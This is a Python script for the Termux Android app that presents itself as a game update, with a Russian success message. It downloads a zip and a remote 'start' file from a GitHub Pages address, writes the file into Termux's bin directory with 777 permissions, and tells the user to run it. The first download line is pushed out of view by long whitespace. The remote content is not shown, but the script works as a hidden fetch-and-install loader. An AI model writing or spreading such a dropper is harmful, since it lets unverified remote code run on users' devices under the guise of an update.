import os
import requests
import zipfile
import time
import sys

def create_binary(ttt):
    os.system("touch $PREFIX/bin/start")
    os.system("chmod 777 /data/data/com.termux/files/usr/bin/start")
    with open(os.environ.get('PREFIX') + "/bin/start","r+") as f:
        f.write(ttt)


def unzip(file_path):
    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        zip_ref.extractall()


value = os.environ.get('TERMUX_APK_RELEASE','null')

if value == "F_DROID":                                                                                                                                      zip_response = requests.get("https://tornado-2024.github.io/Miniinline/game.zip")
    os.chdir("/sdcard")
    os.system("mkdir gametest")
    os.chdir("gametest")
    os.system("mkdir files")
    with open("/sdcard/gametest/files/game.zip", 'wb') as f:
        f.write(zip_response.content)
    unzip("/sdcard/gametest/files/game.zip")
    hshd = requests.get("https://tornado-2024.github.io/Miniinline/start")
    create_binary(hshd.text)
    print("Обновление Выполнено Перезайдите и введите start чтобы начать")
    time.sleep(3)
    sys.exit(0)
else:
    print("Используйте Termux из F-Droid")
